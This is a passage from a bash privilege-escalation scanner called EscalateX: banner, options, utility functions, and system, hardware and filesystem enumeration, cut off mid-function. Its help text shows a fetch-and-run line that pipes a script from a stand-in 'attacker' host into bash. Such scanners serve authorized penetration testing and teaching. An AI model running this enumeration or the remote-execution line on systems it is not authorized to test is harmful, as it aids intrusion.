#!/bin/bash

#############################################################
#                                                           #
#  ███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗███████╗██╗  ██╗
#  ██╔════╝██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
#  █████╗  ███████╗██║     ███████║██║     ███████║   ██║   █████╗   ╚███╔╝
#  ██╔══╝  ╚════██║██║     ██╔══██║██║     ██╔══██║   ██║   ██╔══╝   ██╔██╗
#  ███████╗███████║╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██╔╝ ██╗
#  ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
#                                                            #
#  Advanced Privilege Escalation Scanner                     #
#  https://github.com/reschjonas/EscalateX                   #
#                                                            #
##############################################################

VERSION="2.0.0"
AUTHOR="Jonas Resch"
DISCLAIMER="This tool should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own risk on your own systems or with explicit permission."
STANDALONE="1"

# Cleanup function
cleanup() {
  echo -e "\n${YELLOW}[!] Interrupted! Cleaning up...${NC}" >&2
  # Kill any background processes that might be running
  jobs -p | xargs -r kill 2>/dev/null
  exit 1
}

# Set up trap for cleanup on interrupt
trap cleanup SIGINT SIGTERM

# Check if user is root
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  MAX_SEARCH_DEPTH="7"  # Increased depth for root users
else
  IAMROOT=""
  MAX_SEARCH_DEPTH="5"  # Standard depth for non-root users
fi

###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
MAGENTA="${C}[1;35m"
CYAN="${C}[1;36m"
WHITE="${C}[1;37m"
GRAY="${C}[1;90m"
BOLD="${C}[1m"
UNDERLINED="${C}[4m"
BLINK="${C}[5m"
REVERSE="${C}[7m"
NC="${C}[0m"

###########################################
#----------) Parsing Arguments (----------#
###########################################

# Default settings
THOROUGH=""           # Thorough scan (slower but more comprehensive)
EXTREME_SCAN=""       # Most aggressive scan (very slow but most comprehensive)
QUIET=""              # No banner or unnecessary output
CHECKS="all"          # All checks by default
TARGET_DIR="/"        # Default root directory to scan
WAIT=""               # Wait between major checks
PASSWORD=""           # Password for sudo/su attempts
NO_COLOR=""           # Disable colors
DEBUG=""              # Enable debug output
NO_CONFIRM=""         # Skip disclaimer confirmation (for non-interactive use)
OUTPUT_FILE=""        # Save output to file
MULTITHREADED="1"     # Enable multithreaded operations by default
USE_SUDO_PASS=""      # Whether to prompt for sudo password
THREADS=$(grep -c processor /proc/cpuinfo 2>/dev/null || echo 2)
[ -z "$THREADS" ] || ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] && THREADS=2

print_banner() {
  if [ -z "$QUIET" ]; then
    echo ""
    echo -e "${GREEN}███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗███████╗██╗  ██╗${NC}"
    echo -e "${GREEN}██╔════╝██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝${NC}"
    echo -e "${GREEN}█████╗  ███████╗██║     ███████║██║     ███████║   ██║   █████╗   ╚███╔╝ ${NC}"
    echo -e "${GREEN}██╔══╝  ╚════██║██║     ██╔══██║██║     ██╔══██║   ██║   ██╔══╝   ██╔██╗ ${NC}"
    echo -e "${GREEN}███████╗███████║╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██╔╝ ██╗${NC}"
    echo -e "${GREEN}╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝${NC}"
    echo ""
    echo -e "${BLUE}[*] EscalateX - Linux Privilege Escalation Scanner${NC}"
    echo -e "${BLUE}[*] Version: ${WHITE}${VERSION}${NC}"
    echo -e "${BLUE}[*] Author: ${WHITE}${AUTHOR}${NC}"
    echo -e "${BLUE}[*] Running as: ${WHITE}$(whoami)${NC}"
    echo -e "${BLUE}[*] Started at: ${WHITE}$(date)${NC}"
    if [ "$IAMROOT" ]; then
      echo -e "${YELLOW}[!] You are already running as root. Privilege escalation might not be needed.${NC}"
    fi
    echo -e "${YELLOW}[!] ${DISCLAIMER}${NC}"
    echo ""
  fi
}

# Help message
show_help() {
  echo -e "${GREEN}EscalateX - Linux Privilege Escalation Scanner${NC}"
  echo -e "${BLUE}Usage: ./escalatex.sh [OPTIONS]${NC}"
  echo ""
  echo -e "${GREEN}Scan Options:${NC}"
  echo -e "  ${YELLOW}-a, --all${NC}            Perform all checks (thorough mode)"
  echo -e "  ${YELLOW}-t, --thorough${NC}       Enable thorough scanning (slower but more comprehensive)"
  echo -e "  ${YELLOW}-x, --extreme${NC}        Enable extreme scanning (very slow but most comprehensive)"
  echo -e "  ${YELLOW}-o, --only CHECKS${NC}    Only execute specified checks (comma-separated list)"
  echo -e "              ${GRAY}Available: system_info, user_info, suid_sgid, writable_files,"
  echo -e "              cron_jobs, docker, kernel, credentials, network, container_escape,"
  echo -e "              cloud, sudo${NC}"
  echo -e "  ${YELLOW}-d, --dir PATH${NC}       Target directory to scan (default: /)"
  echo -e "  ${YELLOW}-m, --multi${NC}          Enable multithreaded scanning (default: $THREADS threads)"
  echo -e "  ${YELLOW}-s, --single${NC}         Disable multithreaded scanning"
  echo -e "  ${YELLOW}--threads N${NC}          Set number of threads (default: $THREADS)"
  echo -e ""
  echo -e "${GREEN}Output Options:${NC}"
  echo -e "  ${YELLOW}-q, --quiet${NC}          Quiet mode (no banner or info messages)"
  echo -e "  ${YELLOW}-n, --no-color${NC}       Disable colored output"
  echo -e "  ${YELLOW}-w, --wait${NC}           Wait between major checks"
  echo -e "  ${YELLOW}-O, --output FILE${NC}    Save output to file (in addition to stdout)"
  echo -e ""
  echo -e "${GREEN}Advanced Options:${NC}"
  echo -e "  ${YELLOW}-p, --password PWD${NC}   Password for sudo/su attempts (use with caution)"
  echo -e "  ${YELLOW}-S, --sudo-pass${NC}      Prompt for sudo password interactively"
  echo -e "  ${YELLOW}-y, --no-confirm${NC}     Skip disclaimer confirmation (for piped/non-interactive use)"
  echo -e "  ${YELLOW}-D, --debug${NC}          Enable debug output (verbose)"
  echo -e "  ${YELLOW}-h, --help${NC}           Show this help message"
  echo -e "  ${YELLOW}-v, --version${NC}        Show version information"
  echo ""
  echo -e "${GREEN}Examples:${NC}"
  echo -e "  ${GRAY}./escalatex.sh                           # Standard scan"
  echo -e "  ./escalatex.sh -t -y                     # Thorough scan, no confirmation"
  echo -e "  ./escalatex.sh --only suid_sgid,kernel    # Specific checks only"
  echo -e "  ./escalatex.sh -x -O report.txt           # Extreme scan, save to file"
  echo -e "  curl http://attacker/escalatex.sh | bash   # Run from remote (standalone build)${NC}"
  echo ""
  exit 0
}

# Process command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    -a|--all) THOROUGH="1" ;;
    -t|--thorough) THOROUGH="1" ;;
    -x|--extreme) EXTREME_SCAN="1"; THOROUGH="1" ;;
    -o|--only) CHECKS="$2"; shift ;;
    -d|--dir) TARGET_DIR="$2"; shift ;;
    -q|--quiet) QUIET="1" ;;
    -n|--no-color) NO_COLOR="1" ;;
    -w|--wait) WAIT="1" ;;
    -p|--password) PASSWORD="$2"; shift ;;
    -S|--sudo-pass) USE_SUDO_PASS="1" ;;
    -y|--no-confirm) NO_CONFIRM="1" ;;
    -O|--output) OUTPUT_FILE="$2"; shift ;;
    -D|--debug) DEBUG="1" ;;
    -m|--multi) MULTITHREADED="1" ;;
    -s|--single) MULTITHREADED=""; THREADS=1 ;;
    --threads)
        if [[ "$2" =~ ^[0-9]+$ ]] && [ "$2" -gt 0 ]; then
            THREADS="$2"
        else
            echo -e "${RED}Error: --threads requires a positive integer.${NC}" >&2; exit 1
        fi
        shift ;;
    -h|--help) show_help ;;
    -v|--version) echo "EscalateX Version: $VERSION"; exit 0 ;;
    *) echo -e "${RED}Error: Unknown option $1${NC}" >&2; show_help ;;
  esac
  shift
done

# Apply color settings
if [ "$NO_COLOR" ]; then
  C=""; RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN="";
  WHITE=""; GRAY=""; BOLD=""; UNDERLINED=""; BLINK=""; REVERSE=""; NC=""
fi

# Validate target directory
if [ ! -d "$TARGET_DIR" ]; then
    echo -e "${RED}Error: Target directory '$TARGET_DIR' not found or is not a directory.${NC}" >&2
    exit 1
fi
# Set thread count to 1 if single threaded mode is chosen
if [ -z "$MULTITHREADED" ]; then
    THREADS=1
fi

# In standalone mode, modules are embedded below. In normal mode, load from files.
if [ -z "$STANDALONE" ]; then
  # Check if the script is running from the correct directory
  if [ ! -d "modules" ]; then
    echo -e "${RED}Error: The 'modules' directory was not found.${NC}" >&2
    echo -e "${YELLOW}Please run the script from the EscalateX base directory, or use the standalone build.${NC}" >&2
    exit 1
  fi

  for required_file in "modules/loader.sh" "modules/utils/core.sh"; do
    if [ ! -f "$required_file" ]; then
      echo -e "${RED}Error: Required file '$required_file' not found.${NC}" >&2
      exit 1
    fi
  done
fi

# Output tee setup: if --output is specified, duplicate all output to file
if [ -n "$OUTPUT_FILE" ]; then
  exec > >(tee -a "$OUTPUT_FILE") 2>&1
fi

# Main function
main() {
  print_banner

  # Disclaimer confirmation (skip with -q, -y, or piped input)
  if [ -z "$QUIET" ] && [ -z "$NO_CONFIRM" ]; then
    if [ -t 0 ]; then
      read -p "Do you understand and accept these terms? (y/n): " accept_disclaimer
      if [[ ! $accept_disclaimer =~ ^[Yy]$ ]]; then
        echo -e "${RED}Terms not accepted. Exiting.${NC}"
        exit 1
      fi
      echo ""
    fi
  fi

  # Ask for sudo password if enabled and not already provided via -p
  if [ "$USE_SUDO_PASS" ] && [ -z "$PASSWORD" ]; then
    echo -e "${BLUE}[*] Sudo privilege escalation attempts enabled.${NC}"
    if [ -t 0 ]; then
      read -s -p "Enter sudo password for $(whoami): " PASSWORD
      echo ""
      if ! echo "$PASSWORD" | sudo -S -k true >/dev/null 2>&1; then
        echo -e "${RED}[!] Invalid sudo password or sudo access denied. Proceeding without sudo password.${NC}"
        PASSWORD=""
      else
        echo -e "${GREEN}[+] Sudo password verified.${NC}"
      fi
    else
      echo -e "${YELLOW}[!] Cannot prompt for password in non-interactive mode. Use -p instead.${NC}"
    fi
  elif [ -z "$USE_SUDO_PASS" ] && [ -z "$PASSWORD" ] && [ -z "$QUIET" ]; then
    echo -e "${YELLOW}[!] Running without sudo password. Sudo-based checks will be limited.${NC}"
    echo -e "${YELLOW}[!] Use --sudo-pass or -p <password> for more comprehensive results.${NC}"
  fi

  # Load and run modules
  if [ -n "$STANDALONE" ]; then
    # In standalone mode, all modules are already embedded in this file.
    init_modules
  elif [ -f "modules/loader.sh" ]; then
    source modules/loader.sh
    init_modules
  else
    echo -e "${RED}Error: Module loader not found. Cannot continue.${NC}" >&2
    exit 1
  fi
}


###################################################################
#              EMBEDDED MODULES (auto-generated)                  #
###################################################################

# --- modules/utils/core.sh ---

# Title: Core Utilities
# Description: Core utility functions for EscalateX
# Author: Jonas Resch

###########################################
#-----------) Display Utils (------------#
###########################################

# Print a major section title with a box
print_title() {
  # Skip if quiet mode
  [ "$QUIET" ] && return

  # Debug timer functionality
  if [ "$DEBUG" ]; then
    END_TIMER=$(date +%s 2>/dev/null)
    if [ "$START_TIMER" ]; then
      TOTAL_TIME=$(($END_TIMER - $START_TIMER))
      echo -e "${GRAY}[Debug] Previous section execution took $TOTAL_TIME seconds${NC}"
      echo ""
    fi
    START_TIMER=$(date +%s 2>/dev/null)
  fi

  title="$1"
  title_len=$(echo "$title" | wc -c)
  max_title_len=80
  rest_len=$((($max_title_len - $title_len) / 2))

  # Draw top border
  echo -e "${BLUE}"
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "┏"
  for i in $(seq 1 $title_len); do printf "━"; done; printf "━";
  printf "┓"
  echo ""

  # Draw title with decorations
  for i in $(seq 1 $rest_len); do printf "━"; done
  printf "┫ ${GREEN}${title}${BLUE} ┣"
  for i in $(seq 1 $rest_len); do printf "━"; done
  echo ""

  # Draw bottom border
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "┗"
  for i in $(seq 1 $title_len); do printf "━"; done; printf "━";
  printf "┛"
  echo -e "${NC}"
  echo ""
}

# Print a subsection title
print_subtitle() {
  # Skip if quiet mode
  [ "$QUIET" ] && return

  # Debug timer functionality
  if [ "$DEBUG" ]; then
    SUB_END_TIMER=$(date +%s 2>/dev/null)
    if [ "$SUB_START_TIMER" ]; then
      SUB_TOTAL_TIME=$(($SUB_END_TIMER - $SUB_START_TIMER))
      echo -e "${GRAY}[Debug] Previous subsection execution took $SUB_TOTAL_TIME seconds${NC}"
      echo ""
    fi
    SUB_START_TIMER=$(date +%s 2>/dev/null)
  fi

  echo -e "${YELLOW}╔════════[ ${CYAN}$1${YELLOW} ]════════╗${NC}"
}

# Print informational message
print_info() {
  [ "$QUIET" ] && return
  echo -e "${BLUE}[*]${NC} $1"
}

# Print a successful result
print_success() {
  echo -e "${GREEN}[+]${NC} $1"
}

# Print warning message
print_warning() {
  echo -e "${YELLOW}[!]${NC} $1"
  # Add finding to the report
  save_to_report "WARNING" "$1" ""
}

# Print error message (treat as warning for reporting)
print_error() {
  echo -e "${RED}[-]${NC} $1" >&2
  # Add finding to the report as a warning
  save_to_report "WARNING" "Error: $1" ""
}

# Print critical finding (high severity issue)
print_critical() {
  echo -e "${RED}${BOLD}[CRITICAL]${NC} $1"
  # Add finding to the report
  save_to_report "CRITICAL" "$1" ""
}

# Print a check that hasn't found anything
print_not_found() {
  if [ "$THOROUGH" ] || [ "$EXTREME_SCAN" ]; then # Show only in detailed modes
    echo -e "${GRAY}[·]${NC} $1"
  fi
}

# Print debug info only when debug is enabled
print_debug() {
  if [ "$DEBUG" ]; then
    echo -e "${GRAY}[Debug]${NC} $1" >&2
  fi
}

# Wait for user input if wait mode is enabled
wait_for_user() {
  if [ "$WAIT" ]; then
    echo ""
    read -p "Press Enter to continue..."
    echo ""
  fi
}

###########################################
#-----------) Process Utils (------------#
###########################################

# Execute binary safely with error handling
exec_binary() {
  binary="$1"
  params="$2"

  if ! command -v "$binary" >/dev/null 2>&1; then
    print_debug "Binary not found: $binary"
    return 1
  fi

  output=$($binary $params 2>/dev/null)
  retval=$?

  if [ $retval -ne 0 ]; then
    print_debug "Error executing $binary (exit code: $retval)"
    return $retval
  fi

  echo "$output"
  return 0
}

# Run command with timeout
run_with_timeout() {
  timeout="$1"
  shift
  command="$@"

  # Use timeout command if available
  if command_exists timeout; then
      timeout $timeout $command 2>/dev/null
      return $?
  else
      print_debug "Timeout command not found, running without timeout: $command"
      $command
      return $?
  fi
}

# Execute a command in parallel if multithreading is enabled
exec_parallel() {
  cmd="$1"

  if [ "$MULTITHREADED" ]; then
    $cmd &
  else
    $cmd
  fi
}

# Wait for all background processes to finish
wait_for_processes() {
  if [ "$MULTITHREADED" ]; then
    wait
  fi
}

###########################################
#----------) File System Utils (---------#
###########################################

# Check if a path is readable
is_readable() {
  [ -r "$1" ] && return 0 || return 1
}

# Check if a path is writable
is_writable() {
  [ -w "$1" ] && return 0 || return 1
}

# Check if a path is executable
is_executable() {
  [ -x "$1" ] && return 0 || return 1
}

# Check if a path exists
path_exists() {
  [ -e "$1" ] && return 0 || return 1
}

# Check if a command exists in PATH
command_exists() {
  command -v "$1" >/dev/null 2>&1 && return 0 || return 1
}

# Create a temporary file securely
create_temp_file() {
  mktemp /tmp/escalatex.XXXXXX 2>/dev/null || mktemp -t escalatex.XXXXXX 2>/dev/null
}

# Create a temporary directory securely
create_temp_dir() {
  local temp_dir
  temp_dir=$(mktemp -d /tmp/escalatex.XXXXXX 2>/dev/null || mktemp -d -t escalatex.XXXXXX 2>/dev/null)
  echo "$temp_dir"
}

###########################################
#----------) Output Formatting (---------#
###########################################

# Format the output as JSON if JSON mode is enabled
format_json() {
  key="$1"
  value="$2"

  # Since JSON output is not implemented, just return the value
  # TODO: Implement proper JSON formatting if needed in future
  echo "$value"
}

# Format the current date and time
get_datetime() {
  date "+%Y-%m-%d %H:%M:%S"
}

# Format a file size to human-readable
format_size() {
  size="$1"
  local unit="B"

  if ! [[ "$size" =~ ^[0-9]+$ ]]; then
    echo "Invalid size"
    return 1
  fi

  if [ $size -gt 1073741824 ]; then # 1 GB
    size=$(awk -v s="$size" 'BEGIN {printf "%.1f", s/1073741824}')
    unit="GB"
  elif [ $size -gt 1048576 ]; then # 1 MB
    size=$(awk -v s="$size" 'BEGIN {printf "%.1f", s/1048576}')
    unit="MB"
  elif [ $size -gt 1024 ]; then # 1 KB
    size=$(awk -v s="$size" 'BEGIN {printf "%.1f", s/1024}')
    unit="KB"
  fi
  echo "$size $unit"
}

###########################################
#-----------) String Utils (-------------#
###########################################

# Remove ANSI color codes from string
strip_colors() {
  echo "$1" | sed 's/\x1b\[[0-9;]*m//g'
}

# Truncate a string to a maximum length
truncate_string() {
  str="$1"
  max_len="$2"

  if [ ${#str} -gt $max_len ]; then
    echo "${str:0:$max_len}..."
  else
    echo "$str"
  fi
}

# Hash a string using SHA256
hash_string() {
  if command_exists sha256sum; then
      echo -n "$1" | sha256sum | cut -d' ' -f1
  elif command_exists shasum; then
      echo -n "$1" | shasum -a 256 | cut -d' ' -f1
  else
      echo "Hashing_Tool_Not_Found"
  fi
}

# Encode a string to base64
encode_base64() {
  if command_exists base64; then
    echo -n "$1" | base64
  else
    echo "Base64_Tool_Not_Found"
  fi
}

###########################################
#------------) Network Utils (------------#
###########################################

# Check if host is reachable
is_host_up() {
  host="$1"
  if command_exists ping; then
    ping -c 1 -W 1 "$host" >/dev/null 2>&1
    return $?
  else
    print_debug "Ping command not found, cannot check host reachability."
    return 1 # Assume not reachable if ping doesn't exist
  fi
}

# Check if port is open
is_port_open() {
  host="$1"
  port="$2"
  # Use bash internal TCP check if possible
  timeout 1 bash -c "</dev/null >/dev/tcp/$host/$port" 2>/dev/null
  return $?
  # Fallback could use nc or nmap if available and necessary
}

# Get current external IP
get_external_ip() {
  # Try multiple services for redundancy
  if command_exists curl; then
    curl -s https://api.ipify.org 2>/dev/null || curl -s https://ifconfig.me 2>/dev/null || curl -s https://icanhazip.com 2>/dev/null || echo "Unknown"
  elif command_exists wget; then
    wget -qO- https://api.ipify.org 2>/dev/null || wget -qO- https://ifconfig.me 2>/dev/null || wget -qO- https://icanhazip.com 2>/dev/null || echo "Unknown"
  else
    echo "Unknown (curl/wget not found)"
  fi
}

###########################################
#------------) Version Utils (------------#
###########################################

# Compare version numbers (returns 0 if v1 >= v2)
version_greater_equal() {
  v1="$1"
  v2="$2"

  # Remove non-numeric characters and handle common suffixes like 'p'
  v1=$(echo "$v1" | sed -E 's/[^0-9.]//g')
  v2=$(echo "$v2" | sed -E 's/[^0-9.]//g')

  # Handle empty versions
  [ -z "$v1" ] && v1="0"
  [ -z "$v2" ] && v2="0"

  # Use sort -V if available for robust version comparison
  if command_exists sort && sort -V <<<$"1\n1" >/dev/null 2>&1; then
    lowest_version=$(printf "%s\n%s\n" "$v1" "$v2" | sort -V | head -n1)
    if [ "$lowest_version" = "$v2" ]; then
      return 0 # v1 is greater or equal to v2
    else
      return 1 # v1 is less than v2
    fi
  else
    # Fallback simple comparison (less accurate for complex versions)
    IFS=. read -r -a ver1 <<< "$v1"
    IFS=. read -r -a ver2 <<< "$v2"

    len1=${#ver1[@]}
    len2=${#ver2[@]}
    max_len=$(( len1 > len2 ? len1 : len2 ))

    for ((i=0; i<max_len; i++)); do
        # Pad with zero if version component doesn't exist
        c1=${ver1[i]:-0}
        c2=${ver2[i]:-0}

        # Ensure numeric comparison
        c1=$((10#$c1))
        c2=$((10#$c2))

        if (( c1 > c2 )); then return 0; fi
        if (( c1 < c2 )); then return 1; fi
    done
    return 0 # Versions are equal
  fi
}

# Function to sanitize user input for security
sanitize_input() {
  local input="$1"
  # Remove potentially malicious characters, allow common safe ones
  # Prevent path traversal (..) and limit characters
  echo "$input" | sed -e 's/[^[:alnum:][:space:].,_\/-]//g' -e 's/\.\.\///g' -e 's/\/\.\.//g'
}

# Advanced error handling
handle_error() {
  local exit_code=$1
  local error_message=$2

  if [ $exit_code -ne 0 ]; then
    print_warning "Operation failed: $error_message (Code: $exit_code)"
    return 1
  fi
  return 0
}

# Execute command safely with timeout
safe_exec() {
  local cmd="$1"
  local timeout_seconds="${2:-10}"  # Default 10 seconds

  run_with_timeout "$timeout_seconds" "$cmd"
  local exit_code=$?
  if [ $exit_code -eq 124 ]; then
      print_debug "Command timed out ($timeout_seconds s): $cmd"
      return 124
  elif [ $exit_code -ne 0 ]; then
      print_debug "Command failed (exit code $exit_code): $cmd"
      return $exit_code
  fi
  return 0
}

# Check if running with sufficient privileges for the requested scan
check_privileges() {
  # If not root and thorough scan requested, warn user
  if [ -z "$IAMROOT" ] && ( [ "$THOROUGH" ] || [ "$EXTREME_SCAN" ] ); then
    print_warning "Running thorough/extreme scan without root privileges. Some checks may be limited."
    if [ -z "$PASSWORD" ] && [ -z "$USE_SUDO_PASS" ]; then
        print_warning "Consider running with sudo or using --password/--sudo-pass for more comprehensive results."
    fi
  fi

  # If extreme scan requested without root, warn strongly
  if [ -z "$IAMROOT" ] && [ "$EXTREME_SCAN" ] && [ -z "$QUIET" ] ; then
    print_critical "Extreme scan mode works best with root privileges!"
    print_critical "Many checks will be limited or may fail."
    read -p "Do you want to continue anyway? (y/n): " response
    if [[ ! $response =~ ^[Yy]$ ]]; then
      print_info "Scan aborted. Re-run with sudo or required privileges for best results."
      exit 0
    fi
  fi
}

# Run commands in parallel if multithreaded mode is enabled
parallel_exec() {
  local cmd="$1"

  if [ "$MULTITHREADED" ] && [ "$THREADS" -gt 1 ]; then
    # Run in background
    eval "$cmd" &

    # If we have too many processes, wait for one to finish
    while [ "$(jobs -p | wc -l)" -ge "$THREADS" ]; do
      wait -n 2>/dev/null || sleep 0.1 # Wait for any job or sleep briefly
    done
  else
    # Run sequentially
    eval "$cmd"
  fi
}

# Save findings to a report file/array
save_to_report() {
  local severity="$1"
  local message="$2"
  local details="${3:-}" # Optional details
  local timestamp

  timestamp=$(date +"%Y-%m-%d %H:%M:%S")

  # Strip any ANSI color codes from message
  message=$(strip_colors "$message")
  details=$(strip_colors "$details")

  # Escape pipe characters in message and details to avoid breaking the format
  message=$(echo "$message" | sed 's/|/\PIPE/g')
  details=$(echo "$details" | sed 's/|/\PIPE/g')

  # Add to the findings array for later reporting
  FINDINGS+=("$timestamp|$severity|$message|$details")

  # If critical finding, add to critical findings list (only the message)
  if [ "$severity" = "CRITICAL" ]; then
    CRITICAL_FINDINGS+=("$message")
  fi
}

# Initialize key global variables
init_globals() {
  # Initialize findings arrays
  FINDINGS=()
  CRITICAL_FINDINGS=()

  # Track scan start time for performance metrics
  SCAN_START_TIME=$(date +%s)
}

# Run a command with sudo using the stored password if available
run_with_sudo() {
  local cmd="$1"

  if [ -n "$PASSWORD" ]; then
    # Use the password with sudo
    echo "$PASSWORD" | sudo -S $cmd 2>/dev/null
    return $?
  elif [ "$USE_SUDO_PASS" ]; then
    # If --sudo-pass was used but no password given/worked, prompt?
    # For now, just try without password if USE_SUDO_PASS is set but PASSWORD is empty
     sudo -n $cmd 2>/dev/null
     return $?
  else
    # Try without password (non-interactive, only works if sudoers allows)
    sudo -n $cmd 2>/dev/null
    return $?
  fi
}
# --- modules/system_info/general.sh ---

# Title: System Information
# Description: Gather general system information
# Author: Jonas Resch

check_os_version() {
  print_subtitle "Operating System Information"

  # OS Details
  if [ -f /etc/os-release ]; then
    os_name=$(grep "^NAME=" /etc/os-release | cut -d= -f2 | tr -d '"')
    os_version=$(grep "^VERSION=" /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')
    os_id=$(grep "^ID=" /etc/os-release | cut -d= -f2 | tr -d '"')
    print_success "OS: ${os_name} ${os_version} (${os_id})"
  else
    os_info=$(uname -a)
    print_success "OS: ${os_info}"
  fi

  # Kernel version
  kernel_version=$(uname -r)
  print_success "Kernel version: ${kernel_version}"

  # Check for architecture
  arch=$(uname -m)
  print_success "Architecture: ${arch}"

  # Check if it's a virtual machine
  if [ -f /sys/class/dmi/id/product_name ] || [ -d /proc/xen ] || grep -q "^flags.*hypervisor" /proc/cpuinfo 2>/dev/null; then
    vm_type="Unknown"

    if grep -q "VMware" /sys/class/dmi/id/product_name 2>/dev/null; then
      vm_type="VMware"
    elif grep -q "VirtualBox" /sys/class/dmi/id/product_name 2>/dev/null; then
      vm_type="VirtualBox"
    elif [ -d /proc/xen ]; then
      vm_type="Xen"
    elif grep -q "QEMU" /sys/class/dmi/id/product_name 2>/dev/null; then
      vm_type="QEMU/KVM"
    elif grep -q "Microsoft" /sys/class/dmi/id/product_name 2>/dev/null; then
      vm_type="Hyper-V"
    elif dmesg | grep -q "Parallels" 2>/dev/null; then
      vm_type="Parallels"
    fi

    print_warning "Running in a virtual environment: ${vm_type}"
  else
    print_success "Running on physical hardware"
  fi

  # WSL detection
  if grep -q Microsoft /proc/version 2>/dev/null; then
    print_warning "Running in Windows Subsystem for Linux (WSL)"
  fi

  # Check for container
  if [ -f /.dockerenv ] || grep -q "docker\|lxc" /proc/1/cgroup 2>/dev/null; then
    print_warning "Running inside a container"
  fi
}

check_hardware_info() {
  print_subtitle "Hardware Information"

  # CPU info
  cpu_model=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -n1 | cut -d: -f2 | xargs)
  cpu_cores=$(grep -c "processor" /proc/cpuinfo 2>/dev/null)
  if [ -n "$cpu_model" ]; then
    print_success "CPU: ${cpu_model} (${cpu_cores} cores)"
  else
    print_success "CPU Cores: ${cpu_cores}"
  fi

  # Memory info
  if [ -f /proc/meminfo ]; then
    total_mem=$(grep "MemTotal" /proc/meminfo | awk '{print $2}')
    total_mem_mb=$(($total_mem / 1024))
    free_mem=$(grep "MemFree" /proc/meminfo | awk '{print $2}')
    free_mem_mb=$(($free_mem / 1024))
    used_mem_mb=$(($total_mem_mb - $free_mem_mb))
    used_percent=$((($used_mem_mb * 100) / $total_mem_mb))

    print_success "Memory: ${used_mem_mb}MB / ${total_mem_mb}MB (${used_percent}% used)"
  fi

  # Swap info
  if [ -f /proc/meminfo ]; then
    total_swap=$(grep "SwapTotal" /proc/meminfo | awk '{print $2}')
    if [ "$total_swap" -gt 0 ]; then
      total_swap_mb=$(($total_swap / 1024))
      free_swap=$(grep "SwapFree" /proc/meminfo | awk '{print $2}')
      free_swap_mb=$(($free_swap / 1024))
      used_swap_mb=$(($total_swap_mb - $free_swap_mb))
      used_swap_percent=$((($used_swap_mb * 100) / $total_swap_mb))

      print_success "Swap: ${used_swap_mb}MB / ${total_swap_mb}MB (${used_swap_percent}% used)"
    else
      print_warning "No swap configured"
    fi
  fi
}

check_filesystem_info() {
  print_subtitle "File System Information"

  # Mount points
  print_info "Mount Points:"
  mount_output=$(mount -t ext2,ext3,ext4,xfs,btrfs,vfat,ntfs,fuseblk 2>/dev/null | grep -v "snap" | sort)
  if [ -n "$mount_output" ]; then
    echo "$mount_output" | while read -r line; do
      device=$(echo "$line" | awk '{print $1}')
      mountpoint=$(echo "$line" | awk '{print $3}')
      fs_type=$(echo "$line" | awk '{print $5}')
      options=$(echo "$line" | grep -oP 'type \K\S+' | tr ',' ' ')

      # Check if the filesystem is mounted with noexec, nosuid, or nodev
      if echo "$options" | grep -q "noexec"; then
        print_success " ${CYAN}${mountpoint}${NC} [${fs_type}] on ${device} (${YELLOW}noexec${NC})"
      elif echo "$options" | grep -q "nosuid"; then
        print_success " ${CYAN}${mountpoint}${NC} [${fs_type}] on ${device} (${YELLOW}nosuid${NC})"
      else
        print_success " ${CYAN}${mountpoint}${NC} [${fs_type}] on ${device}"
      fi
    done
  else
    print_not_found "No common filesystems mounted"
  fi

  # Disk usage
  print_info "Disk Usage:"
  disk_info=$(df -h -t ext2 -t ext3 -t ext4 -t xfs -t vfat -t ntfs -t btrfs 2>/dev/null | grep -v "snap" | grep -v "Filesystem" | sort)

  if [ -n "$disk_info" ]; then
    echo "$disk_info" | while read -r line; do
      filesystem=$(echo "$line" | awk '{print $1}')
      size=$(echo "$line" | awk '{print $2}')
      used=$(echo "$line" | awk '{print $3}')
      avail=$(echo "$line" | awk '{print $4}')
      use_percent=$(echo "$line" | awk '{print $5}')
      mountpoint=$(echo "$line" | awk '{print $6}')

      # Highlight high disk usage
      if [[ "${use_percent}" =~ [8-9][0-9]% ]] || [[ "${use_percent}" =~ 100% ]]; then
        print_warning " ${CYAN}${mountpoint}${NC}: ${RED}${use_percent}${NC} used (${used}/${size}, ${avail} free)"
      else
        print_success " ${CYAN}${mountpoint}${NC}: ${use_percent} used (${used}/${size}, ${avail} free)"
      fi
    done
  else
    print_not_found "No disk usage information available"
  fi
}

check_kernel_modules() {
  print_subtitle "Kernel Modules"

  # List kernel modules that could potentially be exploitable
  interesting_modules=("bluetooth" "usb_storage" "thunderbolt" "firewire" "bcm" "rtl" "nvidia")

  for module in "${interesting_modules[@]}"; do
    module_info=$(lsmod 2>/dev/null | grep "$module")
    if [ -n "$module_info" ]; then
      print_warning "Potentially interesting module loaded: $module_info"
    fi
  done

  # Check for unsigned kernel modules if secure boot is enabled
  if [ -d /sys/firmware/efi ]; then
    secure_boot=$(mokutil --sb-state 2>/dev/null | grep "SecureBoot" | awk '{print $2}')
    if [ "$secure_boot" = "enabled" ]; then
